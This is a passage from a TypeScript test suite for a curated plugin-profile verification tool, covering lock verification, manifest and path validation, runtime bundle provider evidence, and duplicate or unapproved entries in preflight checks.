      unlinkSync(join(packageDir, '.dsh-curated-artifact.json'))
      expect(resolver.resolve(candidate)).toBeUndefined()

      writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
        repository: candidate.repository,
        commit: candidate.commit,
        sourceContentSha256: candidate.sourceContentSha256,
        changedPaths: [1],
      }))
      expect(resolver.resolve(candidate)).toBeUndefined()

      writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
        repository: candidate.repository,
        commit: candidate.commit,
        sourceContentSha256: candidate.sourceContentSha256,
        changedPaths: [],
      }))
      writeFileSync(join(root, 'package.json'), JSON.stringify({ private: true }))
      expect(resolver.resolve(candidate)).toBeUndefined()

      for (const profile of [null, 'plugin-a', []]) {
        writeFileSync(join(root, 'package.json'), JSON.stringify({
          dsh: { profile },
        }))
        expect(() => resolver.resolve(candidate)).toThrow('profile metadata must be an object')
      }

      writeFileSync(join(root, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: 'plugin-a' } },
      }))
      expect(() => resolver.resolve(candidate)).toThrow('managed profile bundles must be a string array')

      writeFileSync(join(root, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: [] } },
      }))
      expect(resolver.resolve(candidate)).toBeUndefined()
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('skips artifact resolution for inactive candidates', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      active: false,
      targetProfiles: [],
      rejections: [{ code: 'inactive-fixture', evidence: 'fixture remains inactive' }],
    }))
    let calls = 0
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [packageRoot],
        artifactResolver: {
          resolve: () => {
            calls += 1
            return undefined
          },
        },
      })

      expect(result.status).toBe(0)
      expect(calls).toBe(0)
    } finally {
      cleanup(catalogPath)
    }
  })

  it.each([
    {
      name: 'repository metadata',
      expectedCode: 'artifact-repository-mismatch',
      candidateOverrides: {},
      setup: (root: string) => {
        const packageDir = stageCandidatePackage(root, 'plugin-a')
        writeFileSync(join(packageDir, '.dsh-curated-artifact.json'), JSON.stringify({
          repository: 'https://github.com/example/other',
          commit: fixtureCommitB,
          sourceContentSha256: fixtureShaA,
          changedPaths: [],
        }))
      },
    },
    {
      name: 'manifest contents',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: {},
      setup: (root: string) => {
        const packageDir = stageCandidatePackage(root, 'plugin-a')
        writeFileSync(join(packageDir, 'package.json'), '[]')
      },
    },
    {
      name: 'unsafe manifest path',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: { manifestPath: '../package.json' },
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a')
      },
    },
    {
      name: 'missing manifest path',
      expectedCode: 'artifact-manifest-invalid',
      candidateOverrides: { manifestPath: null },
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a')
      },
    },
    {
      name: 'missing bundle declaration',
      expectedCode: 'artifact-bundle-patch-missing',
      candidateOverrides: {},
      setup: (root: string) => {
        stageCandidatePackage(root, 'plugin-a', undefined, { dsh: {} })
      },
    },
  ])('rejects invalid observed artifact $name', ({ expectedCode, candidateOverrides, setup }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog(candidateOverrides))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-observed-'))
    setup(root)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({ code: expectedCode }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'missing permission config',
      patch: '[]\n',
      code: 'artifact-permission-config-missing',
    },
    {
      name: 'malformed permission config',
      patch: `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config: invalid
`,
      code: 'artifact-permission-config-malformed',
    },
  ])('rejects $name in installed artifacts', ({ patch, code }) => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      id: 'dsh-permission-rules',
      capability: 'permission-policy',
      expectedPackage: 'dsh-permission-rules',
      resources: {
        entryIds: ['permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    }))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-permission-'))
    stageCandidatePackage(root, 'dsh-permission-rules', patch)
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--artifact-root', root, '--json'])
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code,
        target: 'dsh-permission-rules',
      }))
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('normalizes observed dependency and install-script ordering', () => {
    const installScripts = {
      prepare: 'node prepare.mjs',
      postinstall: 'node postinstall.mjs',
    }
    const catalogPath = tempFile('catalog.json', artifactCatalog({
      externalDependencies: ['dependency-a', 'dependency-b', 'dependency-c'],
      installScripts,
      npmVersion: '1.0.0',
      npmIntegrity: fixtureNpmIntegrity,
      nodeEngine: 'invalid || >=22.19.0',
    }))
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-observed-'))
    stageCandidatePackage(root, 'plugin-a', undefined, {
      dependencies: { 'dependency-c': '1.0.0' },
      optionalDependencies: { 'dependency-a': '1.0.0' },
      peerDependencies: { 'dependency-b': '1.0.0' },
      scripts: {
        postinstall: 'node postinstall.mjs',
        prepare: 'node prepare.mjs',
        test: 'vitest',
      },
      engines: { node: 'invalid || >=22.19.0' },
    })
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        nodeVersion: '22.19.0',
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts absent install scripts and the exact lower bound of a caret Node range', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog({ nodeEngine: '^22.19.0' }))
    const root = stageCandidateArtifact('plugin-a', {
      scripts: undefined,
      engines: { node: '^22.19.0' },
    })
    try {
      const result = runVerifyLock(['--fixture', catalogPath, `--artifact-root=${root}`, '--json'], {
        nodeVersion: '22.19.0',
      })

      expect(result.status).toBe(0)
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects an invalid observed Node version', () => {
    const catalogPath = tempFile('catalog.json', artifactCatalog())
    const root = stageCandidateArtifact('plugin-a')
    try {
      const result = runVerifyLock(['--fixture', catalogPath, '--json'], {
        artifactRoots: [root],
        nodeVersion: 'invalid',
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'Node version "invalid" is invalid' }],
      })
    } finally {
      cleanup(catalogPath)
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('preflight command', () => {
  it('rejects rootless preflight instead of accepting synthesized metadata', () => {
    const result = runPreflight(['--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'preflight',
      ok: false,
      observed: false,
      accepted: false,
      issues: [{ code: 'preflight-profile-root-required' }],
    })
  })

  it('rejects a profile root reached through a symbolic-link ancestor', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-root-symlink-'))
    const actualProfiles = join(root, 'actual-profiles')
    const linkedProfiles = join(root, 'linked-profiles')
    const profileRoot = join(actualProfiles, 'fixture-curated')
    mkdirSync(profileRoot, { recursive: true })
    symlinkSync(actualProfiles, linkedProfiles, process.platform === 'win32' ? 'junction' : 'dir')
    try {
      const result = runPreflight([
        '--profile',
        'fixture-curated',
        '--profile-root',
        join(linkedProfiles, 'fixture-curated'),
        '--json',
      ])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: false,
        issues: [{
          code: 'preflight-input-invalid',
          message: '--profile-root must not contain symbolic-link or junction components',
        }],
      })
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('accepts an observed candidate without required runtime bundles', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-no-required-runtime-bundles-'))
    const {
      requiredRuntimeBundles: _requiredRuntimeBundles,
      ...candidate
    } = artifactCandidate({ targetProfiles: ['fixture-curated'] })
    const commands = await commandsWithCatalogCandidates([candidate])
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'plugin-a',
        undefined,
        {},
        undefined,
        candidate,
      )

      const result = commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot })

      expect(result.status, result.stdout).toBe(0)
      expect(commandIssues(result)).toEqual([])
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects an observed profile that omits an active required runtime bundle provider', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-required-runtime-bundle-'))
    const base = artifactCandidate()
    const candidate = {
      ...base,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        ['fixture-curated'],
        ['runtime-bundle'],
      ),
    }
    const commands = await commandsWithCatalogCandidates([candidate])
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a'] } },
      }))
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
      writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
      writeFileSync(join(profileRoot, 'pnpm-workspace.yaml'), 'packages:\n  - .\n')
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot })

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'preflight-required-runtime-bundle-missing',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects a selected required runtime bundle provider without activation evidence', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-runtime-provider-evidence-'))
    const base = artifactCandidate()
    const consumer = {
      ...base,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        ['fixture-curated'],
        ['runtime-bundle'],
      ),
    }
    const {
      runtimeActivationEvidence: _runtimeActivationEvidence,
      ...provider
    } = artifactCandidate({
      id: 'runtime-provider',
      capability: 'browser',
      expectedPackage: 'runtime-bundle',
      repository: 'https://github.com/example/runtime-provider',
      commit: fixtureCommitC,
      targetProfiles: ['fixture-curated'],
      resources: { entryIds: ['runtime-provider'] },
    })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a', 'runtime-bundle'] } },
      }))
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
      writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
      writeFileSync(join(profileRoot, 'pnpm-workspace.yaml'), 'packages:\n  - .\n')
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, consumer)
      stageCandidatePackage(profileRoot, 'runtime-bundle', undefined, {}, undefined, provider)
      const commands = await commandsWithCatalogCandidates([consumer, provider])

      const result = commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot })

      expect(commandIssues(result)).toContainEqual(expect.objectContaining({
        code: 'preflight-required-runtime-bundle-evidence-missing',
        target: 'plugin-a',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('checks only the required provider evidence for the requested profile', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-runtime-provider-profile-evidence-'))
    const targetProfiles = ['fixture-curated', 'other-curated']
    const consumer = artifactCandidate({
      targetProfiles,
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        targetProfiles,
        ['runtime-bundle'],
      ),
    })
    const provider = artifactCandidate({
      id: 'runtime-provider',
      capability: 'browser',
      expectedPackage: 'runtime-bundle',
      repository: 'https://github.com/example/runtime-provider',
      commit: fixtureCommitC,
      targetProfiles,
      runtimeActivationEvidence: {
        'fixture-curated': fixtureRuntimeActivationEvidenceSet(),
        'other-curated': fixtureRuntimeActivationEvidenceSet(['unexpected-runtime-bundle']),
      },
      resources: { entryIds: ['runtime-provider'] },
    })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a', 'runtime-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, consumer)
      stageCandidatePackage(profileRoot, 'runtime-bundle', undefined, {}, undefined, provider)
      const commands = await commandsWithCatalogCandidates([consumer, provider])

      const result = commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot })

      expect(result.status, result.stdout).toBe(0)
      expect(commandIssues(result)).toEqual([])
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('requires a selected runtime bundle provider in the manifest, both locks, and installed packages', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-runtime-provider-presence-'))
    const base = artifactCandidate()
    const consumer = {
      ...base,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        ['fixture-curated'],
        ['runtime-bundle'],
      ),
    }
    const provider = artifactCandidate({
      id: 'runtime-provider',
      capability: 'browser',
      expectedPackage: 'runtime-bundle',
      repository: 'https://github.com/example/runtime-provider',
      commit: fixtureCommitC,
      targetProfiles: ['fixture-curated'],
      resources: { entryIds: ['runtime-provider'] },
    })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a', 'runtime-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, consumer)
      stageCandidatePackage(profileRoot, 'runtime-bundle', undefined, {}, undefined, provider)
      const commands = await commandsWithCatalogCandidates([consumer, provider])
      const resolver = commands.createInstalledArtifactResolver([profileRoot])
      const manifestPath = join(profileRoot, 'package.json')
      const rootLockPath = join(profileRoot, 'pnpm-lock.yaml')
      const installedLockPath = join(profileRoot, 'node_modules/.pnpm/lock.yaml')
      const manifestContent = readFileSync(manifestPath, 'utf8')
      const rootLockContent = readFileSync(rootLockPath, 'utf8')
      const installedLockContent = readFileSync(installedLockPath, 'utf8')

      expect(resolver.resolve(provider)).toBeDefined()
      const preflight = commands.runPreflight(
        ['--profile', 'fixture-curated', '--json'],
        { profileRoot },
      )
      expect(preflight.status, preflight.stdout).toBe(0)
      expect(commandIssues(preflight)).toEqual([])

      const manifest = JSON.parse(manifestContent) as { dependencies: Record<string, unknown> }
      delete manifest.dependencies['runtime-bundle']
      writeFileSync(manifestPath, JSON.stringify(manifest))
      expect(() => resolver.resolve(provider)).toThrow(
        'runtime-provider is selected by the managed profile but absent from dependencies',
      )
      writeFileSync(manifestPath, manifestContent)

      const rootLock = JSON.parse(rootLockContent) as {
        importers: { '.': { dependencies: Record<string, unknown> } }
      }
      delete rootLock.importers['.'].dependencies['runtime-bundle']
      writeFileSync(rootLockPath, JSON.stringify(rootLock))
      expect(() => resolver.resolve(provider)).toThrow('runtime-provider pnpm dependency must be an object')
      writeFileSync(rootLockPath, rootLockContent)

      const installedLock = JSON.parse(installedLockContent) as {
        importers: { '.': { dependencies: Record<string, unknown> } }
      }
      delete installedLock.importers['.'].dependencies['runtime-bundle']
      writeFileSync(installedLockPath, JSON.stringify(installedLock))
      expect(() => resolver.resolve(provider)).toThrow('runtime-provider pnpm dependency must be an object')
      writeFileSync(installedLockPath, installedLockContent)

      rmSync(join(profileRoot, 'node_modules/runtime-bundle'), { recursive: true, force: true })
      expect(() => resolver.resolve(provider)).toThrow(
        'runtime-provider selected dependency is not installed in the managed profile',
      )
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects provider evidence for a runtime bundle absent from external dependencies', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-runtime-provider-undeclared-'))
    const base = artifactCandidate()
    const consumer = {
      ...base,
      targetProfiles: ['fixture-curated'],
      externalDependencies: ['runtime-bundle'],
      requiredRuntimeBundles: ['runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        ['fixture-curated'],
        ['runtime-bundle'],
      ),
    }
    const provider = artifactCandidate({
      id: 'runtime-provider',
      capability: 'browser',
      expectedPackage: 'runtime-bundle',
      repository: 'https://github.com/example/runtime-provider',
      commit: fixtureCommitC,
      targetProfiles: ['fixture-curated'],
      requiredRuntimeBundles: ['nested-runtime-bundle'],
      runtimeActivationEvidence: fixtureRuntimeActivationEvidenceFor(
        ['fixture-curated'],
        ['nested-runtime-bundle'],
      ),
      resources: { entryIds: ['runtime-provider'] },
    })
    const commands = await commandsWithCatalogCandidates([consumer, provider])
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-fixture-curated',
        private: true,
        dependencies: {},
        dsh: { profile: { bundles: ['plugin-a', 'runtime-bundle'] } },
      }))
      stageCandidatePackage(profileRoot, 'plugin-a', undefined, {}, undefined, consumer)
      stageCandidatePackage(profileRoot, 'runtime-bundle', undefined, {}, undefined, provider)

      const result = commands.runPreflight(['--profile', 'fixture-curated', '--json'], { profileRoot })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; details?: { issues?: string[] } }>
      }

      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-required-runtime-bundle-evidence-missing',
        details: {
          bundle: 'runtime-bundle',
          issues: ['candidate-required-runtime-bundle-undeclared'],
        },
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('labels fixture-only preflight as non-observed and not accepted', () => {
    const path = tempFile('patch.yml', '[]\n')
    try {
      const result = runPreflight(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'preflight',
        ok: true,
        observed: false,
        accepted: false,
      })
    } finally {
      cleanup(path)
    }
  })

  it('keeps explicit fixture preflight non-observed even when profile-root is also supplied', () => {
    const fixture = resolve('packages/curated/curated-base/cordis.patch.yml')
    const result = runPreflight(['--fixture', fixture, '--profile-root', '/definitely/not/a/profile', '--json'])

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'preflight',
      ok: true,
      observed: false,
      accepted: false,
      issues: [],
    })
  })

  it('loads the installed profile patch in addition to resolved bundle patches', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-home-'))
    const profileRoot = join(home, 'profiles', 'custom-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['fixture-bundle'] } },
    }))
    stageCandidatePackage(profileRoot, 'fixture-bundle', `- insert:
    - id: bundle-tool
      name: ./plugin.mjs
      config:
        curated:
          candidateId: bundle-tool
          profile: custom-curated
          active: true
          capability: deterministic-tools
          resources:
            toolNames: [fixture_tool]
`)
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- insert:
    - id: profile-tool
      name: ./profile-plugin.mjs
      config:
        curated:
          candidateId: profile-tool
          profile: custom-curated
          active: true
          capability: deterministic-tools
          resources:
            toolNames: [fixture_tool]
`)
    try {
      const result = runPreflight([
        '--profile',
        'custom-curated',
        '--profile-root',
        profileRoot,
        '--artifact-root',
        profileRoot,
        '--json',
      ])

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as {
        observed: boolean
        accepted: boolean
        entryCount: number
        issues: Array<{ code: string }>
      }
      expect(payload).toMatchObject({
        observed: true,
        accepted: false,
        entryCount: 2,
      })
      expect(payload.issues).toEqual(expect.arrayContaining([
        expect.objectContaining({ code: 'preflight-provider-duplicate' }),
        expect.objectContaining({ code: 'preflight-tool-name-duplicate' }),
      ]))
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects unmanaged observed bundles and duplicate inserts across layers', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-layers-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-base', 'fixture-overlay'] } },
      }))
      stageCandidatePackage(profileRoot, 'fixture-base', `- insert:
    - id: shared-entry
      name: ./plugin.mjs
      config:
        curated:
          candidateId: shared-entry
          profile: custom-curated
          active: true
          capability: shared-capability
          resources:
            toolNames: [shared-tool]
    - id: active-entry
      name: ./plugin.mjs
      config:
        curated:
          candidateId: active-entry
          profile: custom-curated
          active: true
          capability: active-capability
          resources:
            toolNames: [shared-tool]
`)
      stageCandidatePackage(profileRoot, 'fixture-overlay', `- id: shared-entry
  config:
    curated:
      candidateId: shared-entry
      profile: custom-curated
      active: true
      capability: shared-capability
      resources:
        toolNames: [overridden-tool]
  disabled: true
`)

      const accepted = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      expect(accepted.status).toBe(1)
      expect(JSON.parse(accepted.stdout)).toMatchObject({
        observed: true,
        accepted: false,
      })
      expect(commandIssues(accepted)).toContainEqual(expect.objectContaining({
        code: 'preflight-entry-owner-unapproved',
      }))

      writeFileSync(join(profileRoot, 'node_modules', 'fixture-overlay', 'cordis.patch.yml'), `- insert:
    - id: shared-entry
      name: ./plugin.mjs
`)
      const rejected = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      expect(rejected.status).toBe(1)
      const rejectedPayload = JSON.parse(rejected.stdout) as {
        observed: boolean
        accepted: boolean
        issues: Array<{ code: string; target?: string }>
      }
      expect(rejectedPayload).toMatchObject({
        observed: true,
        accepted: false,
      })
      expect(rejectedPayload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-entry-id-duplicate',
        target: 'shared-entry',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects an unmanaged bundle after applying a same-layer Cordis override', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-layer-patch-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-base'] } },
      }))
      stageCandidatePackage(profileRoot, 'fixture-base', `- insert:
    - id: repeated-entry
      name: ./plugin.mjs
      config:
        curated:
          candidateId: repeated-entry
          profile: custom-curated
          active: true
          capability: repeated-capability
          resources:
            toolNames: [repeated-tool]
- id: repeated-entry
  config:
    curated:
      candidateId: repeated-entry
      profile: custom-curated
      active: true
      capability: repeated-capability
      resources:
        toolNames: [repeated-tool]
`)

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        issues: [expect.objectContaining({ code: 'preflight-entry-owner-unapproved' })],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('matches Loader disabled semantics when rejecting nested unapproved executable rows', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-disabled-semantics-'))
    const configPath = join(root, 'cordis.yml')
    const profileRoot = join(root, 'profile')
    const globalState = globalThis as typeof globalThis & {
      __dshCuratedDisabledEvaluated?: string[]
      __dshCuratedDisabledMounted?: string[]
    }
    const staticRows = [
      '        - id: disabled-absent',
      '          name: ./plugin.mjs',
      '          config: { label: absent }',
      '        - id: disabled-false',
      '          name: ./plugin.mjs',
      '          disabled: false',
      '          config: { label: "false" }',
      '        - id: disabled-null',
      '          name: ./plugin.mjs',
      '          disabled: null',
      '          config: { label: "null" }',
      '        - id: disabled-zero',
      '          name: ./plugin.mjs',
      '          disabled: 0',
      '          config: { label: zero }',
      '        - id: disabled-empty',
      '          name: ./plugin.mjs',
      '          disabled: ""',
      '          config: { label: empty }',
      '        - id: disabled-object',
      '          name: ./plugin.mjs',
      '          disabled: { condition: false }',
      '          config: { label: object }',
      '        - id: disabled-true',
      '          name: ./plugin.mjs',
      '          disabled: true',
      '          config: { label: true }',
      '        - id: disabled-parent',
      '          name: cordis:group',
      '          group: true',
      '          disabled: true',
      '          config:',
      '            - id: disabled-object-under-parent',
      '              name: ./plugin.mjs',
      '              disabled: { condition: false }',
      '              config: { label: object-under-parent }',
    ].join('\n')
    const dynamicRows = [
      '        - id: disabled-dynamic-false',
      '          name: ./plugin.mjs',
      "          disabled: !!js (globalThis.__dshCuratedDisabledEvaluated.push('dynamic-false'), false)",
      '          config: { label: dynamic-false }',
      '        - id: disabled-dynamic-true',
      '          name: ./plugin.mjs',
      "          disabled: !!js (globalThis.__dshCuratedDisabledEvaluated.push('dynamic-true'), true)",
      '          config: { label: dynamic-true }',
    ].join('\n')
    const nestedRows = `${staticRows}\n${dynamicRows}`
    const composition = [
      '- id: nested-group',
      '  name: cordis:group',
      '  group: true',
      '  config:',
      nestedRows,
      '',
    ].join('\n')
    mkdirSync(profileRoot)
    writeFileSync(join(root, 'plugin.mjs'), [
      'export function apply(_ctx, config) {',
      '  globalThis.__dshCuratedDisabledMounted.push(config.label)',
      '}',
      '',
    ].join('\n'))
    writeFileSync(configPath, composition)
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['fixture-base'] } },
    }))
    stageCandidatePackage(profileRoot, 'fixture-base', `- insert:
    - id: nested-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
${staticRows}
`)
    globalState.__dshCuratedDisabledEvaluated = []
    globalState.__dshCuratedDisabledMounted = []
    try {
      const ctx = await boot('curated-disabled-semantics', configPath)
      try {
        expect(new Set(globalState.__dshCuratedDisabledEvaluated)).toEqual(
          new Set(['dynamic-false', 'dynamic-true']),
        )
        expect([...ctx.loader.entries()]
          .find(entry => entry.options.id === 'disabled-parent')?.fiber).toBeDefined()
        expect(globalState.__dshCuratedDisabledMounted).toEqual([
          'absent',
          'false',
          'null',
          'zero',
          'empty',
          'dynamic-false',
        ])
      } finally {
        await ctx.fiber.dispose()
      }

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const targets = commandIssues(result)
        .filter(issue => issue.code === 'preflight-entry-owner-unapproved')
        .map(issue => issue.target)

      expect(result.status).toBe(1)
      expect(new Set(targets)).toEqual(new Set([
        'nested-group',
        'disabled-absent',
        'disabled-false',
        'disabled-null',
        'disabled-zero',
        'disabled-empty',
        'disabled-object',
        'disabled-true',
        'disabled-parent',
        'disabled-object-under-parent',
      ]))
    } finally {
      delete globalState.__dshCuratedDisabledEvaluated
      delete globalState.__dshCuratedDisabledMounted
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('rejects duplicate inserted entry ids within one observed patch layer', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-layer-duplicate-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-base'] } },
      }))
      stageCandidatePackage(profileRoot, 'fixture-base', `- insert:
    - id: repeated-entry
      name: ./plugin.mjs
    - id: repeated-entry
      name: ./plugin.mjs
`)

      const result = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as {
        observed: boolean
        accepted: boolean
        issues: Array<{ code: string; target?: string }>
      }
      expect(payload).toMatchObject({
        observed: true,
        accepted: false,
      })
      expect(payload.issues).toContainEqual({
        code: 'preflight-entry-id-duplicate',
        target: 'repeated-entry',
        message: 'curated patch contains duplicate entry ids',
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('reads duplicate resources from installed manifests and real bundle patches', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-toolkit',
      expectedPackage: '@deepseek-ai/dsh-toolkit',
      capability: 'deterministic-tools',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['toolkit-a', 'toolkit-b'],
        toolNames: ['toolkit_read'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-'))
    const patch = `- insert:
    - id: toolkit-a
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-toolkit
          profile: custom-curated
          active: true
          capability: deterministic-tools
          resources:
            toolNames: [toolkit_read]
    - id: toolkit-b
      name: ./plugin.mjs
      config:
        curated:
